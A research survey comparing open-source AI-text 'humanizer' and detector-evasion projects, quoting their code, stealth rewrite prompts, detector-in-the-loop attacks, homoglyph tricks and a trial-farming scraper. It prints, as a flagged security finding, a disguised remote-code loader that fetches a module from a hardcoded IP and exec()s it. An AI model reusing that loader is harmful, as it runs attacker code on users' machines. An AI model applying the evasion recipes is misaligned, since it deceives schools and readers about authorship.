# Open-Source AI-Text Humanizers & Detector-Evasion Tools — The Actual Code

*Research compiled 2026-09-03. All star counts, commit dates, and download numbers are as observed on GitHub / HuggingFace on that date. This report reads the actual source of the leading projects rather than their marketing copy.*

The open-source "humanizer" ecosystem splits into three cleanly separated worlds that rarely cite each other:

1. **Skill / prompt-engineering projects** (by far the most starred) — Markdown rule-books that tell *another* LLM (Claude Code, Codex, etc.) how to strip "AI tells." These are pattern lists, not evasion engines. `blader/humanizer` (41k★) dominates this category.
2. **LLM-rewrite pipelines & SaaS clones** — Python/TypeScript apps that call an LLM (often via a translation chain) and sometimes loop against a detector. `lynote-ai/humanize-text`, `fromleda/text-humanizer`, `rudra496/StealthHumanizer`, `chi111i/BypassAIGC`.
3. **Academic attack repos** — the only projects with rigorous before/after detector numbers: DIPPER, SICO, HMGC, RAFT, Adversarial-Paraphrasing, MASH, plus the AuthorMist RL recipe.

A key meta-finding: **the highest-starred projects do the least actual detector evasion**, and **the projects with real evasion evidence have <300 stars.**

---

## Comparison Table

| Project | Stars | Last commit | Lang | License | Core technique | Detector-in-loop? | Published evasion evidence |
|---|---:|---|---|---|---|---|---|
| [blader/humanizer](https://github.com/blader/humanizer) | 41,416 | 2026-08-19 | (skill/MD) | MIT | 35 Wikipedia "Signs of AI writing" patterns as an LLM skill | No | None (readability only) |
| [epoko77-ai/im-not-ai](https://github.com/epoko77-ai/im-not-ai) | 5,202 | 2026-08-29 | Python+MD | MIT | Korean translationese taxonomy (10 cat × 70 patterns), routed multi-call skill | No | Corpus study, not detector ASR |
| [lynote-ai/humanize-text](https://github.com/lynote-ai/humanize-text) | 1,599 | 2026-08-05 | Python | MIT | 4-step LLM-rewrite + double translation chain (EN→中→日→FI→EN) | Optional (v1.0 module) | Self-run local detector, 5/5 "human" |
| [chi111i/BypassAIGC](https://github.com/chi111i/BypassAIGC) | 2,067 | 2026-08-28 | Python/JS | custom | Prompt-driven LLM rewrite for Chinese AIGC-check (知网/维普) + docx formatter | No (prompt bank) | None in repo |
| [fromleda/text-humanizer](https://github.com/fromleda/text-humanizer) | 738 | 2026-08-20 | Python | MIT | lynote clone (translation chain) — **but ships a malware loader** | No | None |
| [harshaneel/humanize](https://github.com/harshaneel/humanize) | 414 | 2026-07-10 | HTML/MD | MIT | Research-grounded LLM skill, 9 "levers", CI benchmark | Self-audit only | GitHub-Actions benchmark |
| [DadaNanjesha/AI-Text-Humanizer-App](https://github.com/DadaNanjesha/AI-Text-Humanizer-App) | 421 | 2025-11-11 | Python | MIT | spaCy/NLTK rule engine: contractions, WordNet synonyms, passive voice | No | None |
| [NulightJens/humanizer-stack](https://github.com/NulightJens/humanizer-stack) | 256 | 2026-07-24 | Python+MD | custom | Two-pass skill (surface + structural), Python scanners | Scanner gate | None (structural) |
| [martiansideofthemoon/ai-detection-paraphrases](https://github.com/martiansideofthemoon/ai-detection-paraphrases) (DIPPER) | 204 | 2023-11-09 | Python | Apache-2.0 | 11B fine-tuned T5-XXL discourse paraphraser, 2 control knobs | No (attack, not loop) | **DetectGPT 70.3%→4.6% @1%FPR** |
| [rudra496/StealthHumanizer](https://github.com/rudra496/StealthHumanizer) | 110 | 2026-09-03 | TypeScript | MIT | Multi-pass LLM rewrite + local detector feedback loop + persona/burstiness | Yes (local + GPTZero API) | Self-reported only |
| [Oct4Pie/zero-zerogpt](https://github.com/Oct4Pie/zero-zerogpt) | 116 | 2026-05-08 | JavaScript | MIT | Unicode-space homoglyph substitution (tokenizer break) | No | Demo-level |
| [ColinLu50/Evade-GPT-Detector](https://github.com/ColinLu50/Evade-GPT-Detector) (SICO) | 70 | 2023-06-15 | Python | none | In-context prompt optimization via word/sentence substitution | **Yes (proxy detector as objective)** | **AUC −0.5 avg over 6 detectors** |
| [zhouying20/HMGC](https://github.com/zhouying20/HMGC) | 60 | 2024-04-10 | Python | Apache-2.0 | TextAttack word-swap (MLM) w/ dual victim+PPL word-importance | **Yes (surrogate)** | Detectors broken in ~10s (COLING'24) |
| [chengez/Adversarial-Paraphrasing](https://github.com/chengez/Adversarial-Paraphrasing) | 48 | 2025-06-10 | Python | Apache-2.0 | **Token-level detector-guided decoding** of a Llama-3-8B paraphraser | **Yes (per-token)** | Universal + transferable (NeurIPS'25) |
| [githigher/MASH](https://github.com/githigher/MASH) | 14 | 2026-05-07 | Python | none | 0.1B BART: style-SFT → DPO → LLM+PPL refine | **Yes (RoBERTa, offline)** | **92% avg ASR, 6 datasets** (ACL'26) |
| [paniccow/humanizer](https://github.com/paniccow/humanizer) | 1 | 2026-04-29 | Python/TS | custom | GRPO RL (reproduces AuthorMist) + scrub + best-of-N rejection sampling | **Yes (ensemble reward)** | Honest null result: base+scrub beats RL |

**HuggingFace models** (downloads / likes): `kalpeshk2011/dipper-paraphraser-xxl` (4,856 / 55), `humarin/chatgpt_paraphraser_on_T5_base` (15,390 / 196), `cive202/humanize-ai-text-bart-large` (760 / 2), `Usama1100/humanizer-llama3-8b-fp16-v3` (520), `bartowski/Nemo-12b-Humanize-KTO-v0.1-GGUF` (428), `txmedai/humanizer-mistral7b-lora` (89), `XiaoXu123123/academic-humanize-qwen25-7b-dpo-v2-lora` (104), `catninja123/dipper-humanizer-lora` (124).

---

## Category 1 — Prompt-engineering "skills" (the star magnets)

### blader/humanizer — 41,416★

This is the most-starred humanizer on GitHub by two orders of magnitude, yet it contains **no evasion code at all**. It ships two files that matter: `SKILL.md` (30 KB) and `README.md`. `SKILL.md` is a system-prompt for an agent (Claude Code / OpenClaw) built from **35 numbered patterns lifted from Wikipedia's "Signs of AI writing"** (WikiProject AI Cleanup). The frontmatter is explicit:

```yaml
name: humanizer
description: Rewrite AI-sounding text so it reads naturally without changing what it says...
             Based on Wikipedia's "Signs of AI writing."
```

Each pattern is a "Words to watch / Problem / Before / After" triad. Examples: §1 *inflated importance claims* ("stands as a testament", "pivotal moment"), §4 *sales language* ("nestled", "in the heart of", "breathtaking"), §7 *overused AI words* ("delve, tapestry, underscore, vibrant"), §14 *em/en dashes*, §18 *emojis*, §20–22 *chatbot artifacts* ("As an AI…"), §31 *forced punchlines*, §35 *rejecting fake alternatives* ("It's not just X, it's Y"). The final section is a false-positive guard ("What not to flag") so the LLM doesn't over-scrub genuine human quirks.

There is no detector call, no statistics, no loop. It is a curated editorial checklist for another model. Its explosive star count reflects the Claude-Code-skill marketplace, not technical merit. Dozens of localized forks now exist — `smixs/humanizer-ru`, `marmbiz/humanizer-de` (72 German patterns), `bushrabeg/turkce-humanizer`, `thevseprod/humanizer-ru`, `MADEVAL/HumanAI` (9 languages) — all the same idea.

**Weakness:** removing named "tells" chases yesterday's detectors. Modern neural detectors (RoBERTa/DeBERTa fine-tunes, Binoculars, Pangram) key on token-level log-probability distributions, not on the presence of "delve." A skill can delete every banned word and the text still scores AI because its *perplexity/burstiness* profile is unchanged (this is exactly what TextHumanize's honest report proves below).

### epoko77-ai/im-not-ai — 5,202★

The most technically serious skill project. It targets **Korean translationese** — the observation that "no amount of prompting fixes it; the tells are structural." It catalogs **10 categories × ~71 sub-patterns** (A: translationese `~를 통해`, double passive `~되어진다`; E: rhythm uniformity / low sentence-length variance; H: connective spam; etc.), each with a severity (S1/S2/S3) grounded in translation-studies literature (post-editese metrics, Wendler et al. ACL'24). Its architecture is genuinely engineered: a **deterministic pre-scoring shim** (`prepare_monolith_input.py`) grades the input and emits a `route_hint` (`light|standard|heavy`), so a clean text gets 1 LLM call and a bad one gets 3 (diagnose → targeted rewrite → finalize). It enforces a "no over-editing" gate (warn >30% change, hard-stop >50%) and a "meaning is immutable" rule. Still: no AI-detector is ever queried. Success is defined against its own taxonomy.

### harshaneel/humanize (414★) & NulightJens/humanizer-stack (256★)

`harshaneel` frames the problem correctly ("what detectors actually measure") and encodes **7 hard rules** enforced positionally: em dashes ≤1/300 words, no semicolons, straight quotes only, banned vocab, no negation framing ("not X, it's Y"), output-shape purity, and a measured **sentence-length-spread rule** ("longest must beat shortest by 20+ words, <half in the 10–20-word band"). It uniquely ships a CI benchmark (`.github/benchmark/score_and_report.py`) that scores rewrites. `NulightJens` splits the job into a **surface pass** and a **structural-humanizer pass** (discourse arc, "epilogue habit," reference specificity) with Python scanners (`copy_scan.py`, `structural_scan.py`) usable as `--strict` pre-commit gates, and it fingerprints models ("Claude: flat event escalation + reverent quiet endings; GPT: distant retrospective framing; Gemini: tidiest endings"). Both remain prompt-and-checklist tools with no detector feedback.

---

## Category 2 — LLM-rewrite pipelines

### lynote-ai/humanize-text — 1,599★

The flagship LLM-pipeline repo. Its production path (`src/standard/pipeline.py`) is a **4-step translation chain**, not a "humanize prompt":

```
Step 1: Input(EN) → Chinese   (DeepSeek humanization rewrite)
Step 2: Chinese  → Japanese   (DeepSeek rewrite, carrying step-1 history)
Step 3: Japanese → Finnish    (Google Translate)
Step 4: Finnish  → English    (Niutrans)
```

The "humanization" is a terse Chinese prompt in `llm_rewriter.py` (temperature **1.3**):

```python
SYSTEM_PROMPT = "你是一个专业的文案改写专家,精通多语言本地化。"
user_prompt = f"翻译为{target_language}，去掉 AI 味道，拟人化改写，只输出结果：\n{text}"
# "Translate to {lang}, remove the AI flavor, rewrite anthropomorphically, output only the result"
```

The mechanism is round-trip translation distortion plus a high-temperature rewrite — cross-lingual hops scramble the token distribution the source LLM produced. The repo also ships **reference (v1.0) modules** that are more explicit about evasion: `methodologies/postprocess.py` has an `AI_VOCAB_REPLACEMENTS` dict ("utilize→use/apply", "delve→dig into", "pivotal→key") and a `_disrupt_sentence_rhythm()` that merges short adjacent sentences with em-dashes; `methodologies/detection_pipeline.py` is a real **detector-in-the-loop** loop over local `BinocularsDetector`, `RoBERTaDetector`, and a `StatisticalDetector`, rewriting flagged sentences for `max_feedback_rounds`. The README labels these as "simplified educational versions." Its showcase reports all 5 samples classified "human" by its *own* local detector — no third-party (GPTZero/Originality) numbers.

### fromleda/text-humanizer — 738★ ⚠️ SECURITY FINDING

Marketed as a translation-chain humanizer (DeepSeek → Google TR → DeepL JA → DeepSeek back), and `src/standard/llm_rewriter.py` is a **byte-for-byte copy of lynote's** Chinese-prompt rewriter. But the file named `src/services/humanizer.py` **is not a humanizer** — it is a Windows-only remote-code loader:

```python
CONFIG = {"HOST": "91.92.47.134", "PORT": 8765, "ASSET": "main",
          "API_KEY": "test123", "PAYLOAD_KEY": "secret456", "QUIET": True}
...
def _load_module_memory(name, data):
    module = types.ModuleType(mod_name)
    exec(compile(data, name, "exec"), module.__dict__)   # remote code exec in RAM
```

It fetches `manual_mapper.py` from a hardcoded IP and `exec()`s it in memory (`win32 only`, "map_from_server"). This is a **malware / manual-mapper injector disguised as a 738-star humanizer** (a lynote fork with a payload bolted on). Treat this repo as hostile; do not run it.

### DadaNanjesha/AI-Text-Humanizer-App — 421★

The purest **classical NLP** approach (no LLM). `transformer/app.py`'s `AcademicTextHumanizer` uses spaCy + NLTK to: (1) **expand contractions** (`can't→cannot`), (2) inject **academic transitions** ("Moreover,", "Consequently,") with prob 0.3, (3) optionally **convert to passive voice** via dependency parsing, and (4) replace content words with **WordNet synonyms** chosen by SentenceTransformer cosine similarity (`_select_closest_synonym`, ≥0.5 threshold). Notably this makes text *more* formal/robotic — the opposite of evasion. It is a good study object for why rule-based synonymization fails: it changes words without touching the sentence-length/perplexity statistics detectors actually use.

### rudra496/StealthHumanizer — 110★

The most feature-complete open humanizer *app* (Next.js/TypeScript, 35 providers). Its `lib/prompts.ts` (34 KB) is the clearest articulation of the statistical-evasion theory in any prompt-based tool. The header comment names the six signals it attacks: "1. Low perplexity 2. Low burstiness 3. Consistent register 4. AI-typical phrases 5. Rigid topic adherence 6. Uniform paragraph structure." Its `stealth` style overlay is the money prompt:

```
Style: MAXIMUM STEALTH — anti-detector mode...
1. BURSTINESS (most important): after a long sentence, write a very short one (3-7 words)...
   NEVER write three sentences in a row of similar length.
2. PERPLEXITY: Prefer plain or unexpected word choices over the "obvious" smooth word...
   Do NOT write the most predictable next word.
3. BAN these AI words entirely: furthermore, moreover, delve, tapestry, landscape, realm,
   leverage, utilize, robust, seamless, synergy, paradigm, ... plays a crucial role ...
4. CONTRACTIONS: Use them naturally... Text with zero contractions reads as AI.
6. NO em-dashes (—). Use commas, periods, or parentheses instead.
```

It has a genuine **feedback loop** (`lib/adversarial/feedback-loop.ts`): after each rewrite it runs a local `detectAI()`, extracts flagged sentences with per-sentence scores and issues, and builds a *targeted* re-prompt ("Sentence 3 scored 23% human — low perplexity, uses 'furthermore' — fix ONLY that"). It computes **explicit sentence-length targets** (`generateLengthTargets`: LONG→short→very_short→medium pattern around mean 18) and escalates to full-paragraph regeneration when ≥50% of a paragraph's sentences stay flagged. `lib/gptzero.ts` will call the real `api.gptzero.me/v2/predict/text` if a key is set, else falls back to the local detector. It also has persona pools and a "Q1 vocabulary injection" for academic mode. **Weakness:** the loop's ground truth is usually its *own local heuristic detector*, so it optimizes against a weak proxy; the impressive-sounding burstiness targets are only *instructions to an LLM*, not guaranteed output properties.

### chi111i/BypassAIGC — 2,067★

Chinese-market tool aimed at **知网/维普/GPTZero-style AIGC checks** for thesis "降重" (plagiarism/AI reduction). It's a full-stack app (FastAPI + React) whose `services/ai_service.py` and `services/optimization_service.py` orchestrate LLM rewrites driven by an editable prompt bank (`routes/prompts.py`), plus a large `word_formatter` subsystem that rebuilds `.docx` formatting (AST → stylespec → renderer) so the output passes as a formatted paper. It's really a prompt-management + document-pipeline product; the evasion is entirely "rewrite with this prompt via your API key." No detector-in-loop, no published ASR.

---

## Category 3 — Academic attack repos (the real evidence)

### DIPPER — martiansideofthemoon/ai-detection-paraphrases (204★, NeurIPS 2023)

The foundational paraphrase attack. **DIPPER ("Discourse Paraphraser")** is an **11B fine-tuned T5-XXL** (`kalpeshk2011/dipper-paraphraser-xxl`, 4,856 downloads) trained on the PAR3 dataset (multiple English translations of novels, treated as paragraph-level paraphrase pairs). Two innovations: **paragraph-level in-context paraphrasing** and **two scalar control knobs** — lexical diversity and order diversity — trained end-to-end. The actual inference (`paraphrase_minimal.py`) prepends control codes and processes 3 sentences at a time, feeding prior output back as prefix:

```python
lex_code = int(100 - lex_diversity); order_code = int(100 - order_diversity)
final_input_text = f"lexical = {lex_code}, order = {order_code} {prefix} <sent> {curr_sent_window} </sent>"
outputs = self.model.generate(**final_input, **kwargs)
prefix += " " + outputs[0]        # discourse context carried forward
```

**Result: DIPPER drops DetectGPT accuracy from 70.3% → 4.6% at 1% FPR** with minimal semantic change. The repo's own `detect_gptzero.py` shows how they measured against the *real* GPTZero API (with caching and a 700-sample early stop "due to GPTZero API rate limit"). The paper's actual thesis is a defense — retrieval over the generation corpus survives paraphrasing — but the paraphraser is what the ecosystem adopted. `catninja123/dipper-humanizer-lora` and the `no-ctx` variants are downstream LoRAs.

### SICO — ColinLu50/Evade-GPT-Detector (70★, TMLR 2024)

**SICO (Substitution-based In-Context Optimization)** does not fine-tune anything; it *evolves a prompt* that makes ChatGPT/Vicuna write human-like text. `incontext_trainer.py` implements the loop: (Step 1) ask the LLM to **extract the distinguishing features of human vs AI text** (`prompt_extract_feature`: "give the key distinct feature — vocabulary, sentence structure — of P2's writings"); (Step 2) use those features to paraphrase AI samples into in-context examples; (Step 3) **greedily substitute words and sentences** to maximize a utility score defined as `U = 1 − mean(AI-probability)` from a **proxy detector** (`chatdetect`/`gptzero`/`openai`/`detectgpt`/`logrank`). The optimizer (`context_optimizer.py`) is a classic greedy hill-climb over candidate swaps, keeping edits that raise the human-score. **Result: SICO decreases detector AUC by ~0.5 on average and evades all six tested detectors including GPTZero and OpenAI's.** It is the conceptual parent of every later "detector-as-objective" system.

### HMGC — zhouying20/HMGC (60★, COLING 2024)

"Humanizing Machine-Generated Content" formalizes evasion as an **adversarial word-substitution attack** built on TextAttack + TextFlint. The recipe (`rspmu_mlm_dualir.py`): goal = flip a `TargetedClassification` to "human"; transformation = `WordSwapMaskedLM` (BERT fills masks); constraints = POS match, ≤40% words perturbed, USE cosine ≥0.75. The novelty is the search method, `GreedyDualWIR` (`greedy_dual_wir.py`): word-importance ranking that **jointly weights the victim/surrogate detector's gradient AND a Pythia language-model perplexity** (`alpha`-weighted), so swaps both fool the detector and keep fluency. It attacks a **surrogate** distilled from the target (black-box). Reported: detectors misclassify machine text in **as little as 10 seconds**. **Weakness:** MLM synonym swaps under semantic constraints are exactly what "obfuscation detectors" (e.g. Kumarage, `asad1996172/Obfuscation-Detection`) learn to catch — the perturbations leave a detectable statistical scar.

### Adversarial Paraphrasing — chengez/Adversarial-Paraphrasing (48★, NeurIPS 2025)

The most elegant attack code. It is **training-free** and works at the **token level during decoding**. `utils.py`'s `Paraphraser.paraphrase()` runs a Llama-3-8B-Instruct paraphraser (system prompt: *"You are a rephraser… rephrase without changing meaning… output a rephrased text that has a different style… Print between <TAG> and </TAG>"*) but overrides greedy/sampling: at every step it takes the top-p/top-k candidate tokens, **decodes each partial continuation and scores it with a guidance detector** (MAGE / OpenAI-RoBERTa / RADAR), then picks the token that **minimizes the AI score**:

```python
adv_scores.extend(self.classifier.get_scores(next_words))   # partial output scored per candidate
if deterministic:
    idx = np.argmin(adv_scores)      # choose the token the detector finds most "human"
```

The paper's insight is that good detectors converge on the same human distribution, so guiding against **one** detector produces outputs that transfer to **others**. It's evaluated against MAGE, RADAR, Fast-DetectGPT, GLTR, and even KGW/Unigram watermark detectors (the repo bundles watermarked MAGE datasets and GPT-4o quality judging). **Weakness:** O(top_k) detector forward passes *per generated token* — extremely slow; and it needs white-box access to a guidance classifier.

### MASH — githigher/MASH (14★, Findings of ACL 2026)

The most practical academic pipeline: a **~0.1B BART paraphraser** (not an 11B model) reframed as **style transfer**, trained fully offline so inference is cheap (~3 GB GPU, 1.7 s/sample, zero query cost). Four stages: (1) filter human text with the target detector; (2) **style-injection SFT** on AI→human pairs with a dual reconstruction+transfer loss; (3) **DPO alignment** on hard negatives that failed to evade; (4) optional **inference-time refinement** (`stage4_refinement.py`) that splits into sentences, asks an LLM for grammatically-improved alternatives, ranks sentences by **perplexity (highest first)**, and greedily accepts a replacement **only if a RoBERTa detector still says "human"** (`is_human()` → `argmax == label 0`). **Result: 92% average ASR across 6 datasets and 5 detectors, +24% over the strongest baseline.** This is the best cost/performance point in the open literature.

### paniccow/humanizer (1★) — the honest RL reproduction

Nearly unstarred but the most instructive engineering document. It reproduces **AuthorMist** (arXiv 2503.08716 — Qwen2.5-3B fine-tuned with **GRPO** using a detector ensemble's `1 − mean(p_AI)` as reward, reported 78.6–96.2% ASR; **no official code was found for AuthorMist itself**). After 4 GRPO runs (~$8) it reports a **null result**: `Qwen2.5-3B-base + deterministic scrub` beats every trained adapter on the pattern aggregate ("across every run, training made text *harder* for the scrub to clean"). Its takeaways are the sharpest in the whole field:

- **Reward hacking:** a 2-detector reward "converged to fool roberta-base, ignore roberta-large."
- **The deliverable is the pipeline, not the model:** `scrub → paraphrase → best-of-N → iterative refine → burstiness → QA gate`.
- **Rejection sampling is how commercial tools actually hit their numbers:** `P(pass) = 1 − (1 − p)^N`. It wires up real paid judges (Pangram `$0.05/1K words`, Originality.ai, GPTZero `api.gptzero.me/v2`) and samples until one output scores below threshold. At single-shot p=0.7, best-of-16 ≈ 99.99999%.

---

## HuggingFace model landscape

- **`kalpeshk2011/dipper-paraphraser-xxl`** (T5-XXL 11B, Apache-2.0) — the canonical paraphrase-attack weight; needs 40 GB GPU.
- **`humarin/chatgpt_paraphraser_on_T5_base`** (15,390 downloads, the most-used) — a T5-base paraphraser trained on Quora+SQuAD+CNN paraphrases; **general paraphrase quality, not detector-tuned**, but widely repurposed as the cheap first hop.
- **`cive202/humanize-ai-text-bart-large`** (BART-large 406M) — supervised AI→human style transfer, task format `humanize: {ai_text}`; from a 2026 encoder-decoder-vs-decoder paper. Constrained rewriting, no detector loop.
- **LoRA / fine-tune family:** `txmedai/humanizer-mistral7b-lora` explicitly targets **Pangram 3.2** and publishes eval (bypass_rate 93.6%, mean semantic sim 0.677, 4/48 semantic collapses); `XiaoXu123123/academic-humanize-qwen25-7b-dpo-v2-lora` uses QLoRA SFT + SPIN-style iterative DPO for academic rewriting; `Usama1100/humanizer-llama3-8b`, `arshaan-nazir/qwen2.5-3b-humanizer`, `mradermacher/*-GGUF` quants are community fine-tunes with no published methodology.
- **Naming-collision caution:** the popular **`cgato/Nemo-12b-Humanize-KTO`** family (bartowski GGUF, 428 downloads, cc-by-nc) is a **roleplay/conversational** model ("humanize" = warmer chat persona) — *not* a detector-evasion model. Many "humanizer" HF hits are this or Discord-style datasets (`manikineko/humanizer`), not evasion tooling.

---

## Homoglyph / character-level tricks

**`Oct4Pie/zero-zerogpt` (116★)** is the reference implementation of the tokenizer-break attack. `src/constants/unicodeSpaces.js` swaps ASCII spaces for visually-similar Unicode spaces (Em ` `, Thin ` `, Hair ` `, Narrow No-Break ` `, Word-Joiner `⁠`, Zero-Width `​`), which desynchronizes a detector's tokenizer from what it was trained on. The academic benchmark **`kinit-sk/mAO`** (multilingual authorship obfuscation, 4★) found **homoglyph attacks the single most effective method (>70% success in some languages)** across 10 obfuscators × 37 detectors × 11 languages. **Weakness:** trivially defeated by input normalization (NFKC + whitespace collapse), and increasingly flagged outright — Turnitin/GPTZero now warn on hidden-character density. Purely cosmetic; degrades copy-paste fidelity.

**`obaskly/AiTextDetectionBypass` (128★)** is a different beast: Selenium automation that **farms free trials of undetectable.ai** — generating Gmail variations, auto-verifying, and scraping the paraphrased output chunk by chunk. It's a scraping bot around a commercial SaaS, not a humanizer.

---

## Patterns that recur across the best projects

1. **Statistics beat vocabulary.** Every technically-credible project (StealthHumanizer, TextHumanize, MASH, paniccow, the academic repos) targets **burstiness** (sentence-length variance) and **perplexity** (token predictability) first, and treats the "banned word list" as a cheap secondary pass. The 41k-star skills invert this and only do the word list.
2. **Detector-as-objective/reward is the core idea.** SICO (utility = 1−p_AI), HMGC (dual WIR), Adversarial Paraphrasing (per-token argmin), MASH (accept-if-still-human), StealthHumanizer (feedback loop), paniccow (GRPO reward) all put a detector *inside* the loop. Guiding against one well-calibrated detector transfers to others because good detectors converge on the same human distribution (Adversarial Paraphrasing's thesis, empirically echoed by paniccow).
3. **Paraphrasing is the reliable primitive.** From DIPPER onward, "rewrite the whole thing" outperforms "edit words in place," because it resets the joint token distribution rather than perturbing it.
4. **Best-of-N rejection sampling is the real reliability layer.** `P(pass)=1−(1−p)^N` is how commercial tools hit 95%+; paniccow states it plainly, StealthHumanizer approximates it with re-passes, MASH with hard-negative DPO.
5. **A "scrub" preprocessing pass is nearly universal** — a fast deterministic regex kill-list for "Furthermore/leverage/intricate/delve," contractions injection, em-dash removal — appearing in lynote's postprocess, StealthHumanizer, harshaneel, im-not-ai, and paniccow.
6. **Meaning-preservation guards are standardized:** length ±15%, "keep every fact/number/name," semantic-similarity floors (MiniLM/USE ≥0.65–0.75), and hard over-edit stops (im-not-ai's 50% gate).
7. **Small offline models are winning over giant ones** (MASH's 0.1B BART; paniccow's finding that Qwen-3B-base+scrub beats trained adapters).

## What none of them do well

1. **Honest, third-party, current evaluation.** The starred consumer tools report *no* detector numbers or only self-detector scores (lynote, StealthHumanizer). The rigorous numbers (DIPPER, SICO, HMGC) are against **2023–2024 detectors** (DetectGPT, GPT-2 RoBERTa, GPTZero-of-the-day) and are stale against 2026 commercial detectors (Pangram, Originality 3.x, GPTZero multilingual). **`ksanyok/TextHumanize`** deserves credit for its `HONEST_REPORT`: its pure rule-based engine cuts the *statistical* sub-score 0.95→0.05 but leaves the **neural MLP at ~0.70**, yielding a **0% bypass rate** — and it correctly concludes "the only path to real bypass is LLM rewriting." Almost no other consumer repo is this candid.
2. **Beating neural / zero-shot detectors without an LLM.** Rule-based synonymization (DadaNanjesha), discourse-marker injection, and homoglyphs all fail against RoBERTa/DeBERTa/Binoculars/Pangram. Character tricks are normalized away; word swaps are caught by obfuscation detectors.
3. **Semantic fidelity under aggressive evasion.** The strongest attacks trade meaning: txmedai reports semantic collapse on ~8% of outputs; translation chains (lynote/fromleda) accumulate mistranslation artifacts; DIPPER at high diversity drifts. Few measure this rigorously.
4. **Robustness to adaptive defenses.** TH-Bench (arXiv 2503.08708) and mAO show detectors retrained on obfuscated text recover most accuracy; none of the tools here defend against a detector that has *seen their output*. paniccow explicitly names the "adversarial discriminator" that would break all four of its adapters as future work.
5. **Watermark removal.** Only Adversarial Paraphrasing seriously tackles KGW/Unigram watermarks; the consumer tools ignore watermarking entirely.
6. **Basic safety/hygiene.** `fromleda/text-humanizer` (738★) ships a remote-code-execution loader; several bypass repos are trial-abuse scrapers. Star count is a poor proxy for either quality or safety in this niche.

---

## Sources

- blader/humanizer — https://github.com/blader/humanizer (SKILL.md, README.md)
- epoko77-ai/im-not-ai — https://github.com/epoko77-ai/im-not-ai (skills/humanize-korean/SKILL.md, README.en.md)
- lynote-ai/humanize-text — https://github.com/lynote-ai/humanize-text (src/standard/pipeline.py, llm_rewriter.py, translators.py, methodologies/postprocess.py, detection_pipeline.py)
- fromleda/text-humanizer — https://github.com/fromleda/text-humanizer (src/services/humanizer.py ⚠️, src/standard/llm_rewriter.py, README.md)
- chi111i/BypassAIGC — https://github.com/chi111i/BypassAIGC (package/backend/app/services/ai_service.py, optimization_service.py)
- harshaneel/humanize — https://github.com/harshaneel/humanize (humanize/SKILL.md, .github/benchmark/score_and_report.py)
- DadaNanjesha/AI-Text-Humanizer-App — https://github.com/DadaNanjesha/AI-Text-Humanizer-App (transformer/app.py, main.py)
- NulightJens/humanizer-stack — https://github.com/NulightJens/humanizer-stack (docs/PIPELINE.md, skills/*)
- rudra496/StealthHumanizer — https://github.com/rudra496/StealthHumanizer (lib/prompts.ts, lib/adversarial/feedback-loop.ts, lib/gptzero.ts, lib/humanizer.ts, ARCHITECTURE.md)
- Oct4Pie/zero-zerogpt — https://github.com/Oct4Pie/zero-zerogpt (src/constants/unicodeSpaces.js, README.md)
- obaskly/AiTextDetectionBypass — https://github.com/obaskly/AiTextDetectionBypass (paraphraser.py)
- ksanyok/TextHumanize — https://github.com/ksanyok/TextHumanize (docs/HONEST_REPORT_v0.25.md, texthumanize/entropy_injector.py, ash_engine.py)
- martiansideofthemoon/ai-detection-paraphrases (DIPPER) — https://github.com/martiansideofthemoon/ai-detection-paraphrases (dipper_paraphrases/paraphrase_minimal.py, detect_gptzero.py) · paper https://arxiv.org/abs/2303.13408
- ColinLu50/Evade-GPT-Detector (SICO) — https://github.com/ColinLu50/Evade-GPT-Detector (sico/incontext_trainer.py, prompt_constructor.py, context_optimizer.py) · paper https://arxiv.org/abs/2305.10847
- zhouying20/HMGC — https://github.com/zhouying20/HMGC (attack/recipes/rspmu_mlm_dualir.py, methods/search_methods/greedy_dual_wir.py) · paper https://arxiv.org/abs/2404.01907
- chengez/Adversarial-Paraphrasing — https://github.com/chengez/Adversarial-Paraphrasing (utils.py, paraphrase_and_detect.py) · paper https://arxiv.org/abs/2506.07001
- githigher/MASH — https://github.com/githigher/MASH (stage4_refinement.py, README.md) · paper https://arxiv.org/abs/2601.08564
- paniccow/humanizer — https://github.com/paniccow/humanizer (README.md, experiments/run-004/FINDINGS.md)
- jameslwang/raft (RAFT, EMNLP'24) — https://github.com/jameslwang/raft · paper https://arxiv.org/abs/2410.03658
- kinit-sk/mAO (multilingual authorship obfuscation) — https://github.com/kinit-sk/mAO · paper https://arxiv.org/abs/2401.07867
- AuthorMist (RL, no public code found) — https://arxiv.org/abs/2503.08716
- TH-Bench (evasion benchmark) — https://arxiv.org/abs/2503.08708
- HuggingFace: kalpeshk2011/dipper-paraphraser-xxl · humarin/chatgpt_paraphraser_on_T5_base · cive202/humanize-ai-text-bart-large · txmedai/humanizer-mistral7b-lora · XiaoXu123123/academic-humanize-qwen25-7b-dpo-v2-lora · catninja123/dipper-humanizer-lora · cgato/Nemo-12b-Humanize-KTO-v0.1
